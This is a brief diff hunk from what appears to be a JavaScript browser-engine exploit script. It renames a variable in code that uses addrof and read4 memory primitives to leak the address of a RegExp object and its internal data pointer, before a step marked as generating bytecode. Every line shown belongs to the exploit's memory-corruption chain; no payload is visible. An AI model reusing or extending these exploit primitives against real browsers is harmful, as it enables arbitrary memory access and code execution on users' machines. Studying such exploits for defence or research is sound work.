@@ -27,10 +27,10 @@ function write4(addr, value) {
 
 let re = /.*/;
 
-let regexp_addr = addrof(re);
-console.log(`[+] regexp_addr == ${hex(regexp_addr)}`);
+let re_addr = addrof(re);
+console.log(`[+] re_addr == ${hex(re_addr)}`);
 
-let data_addr = read4(regexp_addr + 0xc) - 1;
+let data_addr = read4(re_addr + 0xc) - 1;
 console.log(`[+] data_addr == ${hex(data_addr)}`);
 
 // generate bytecode
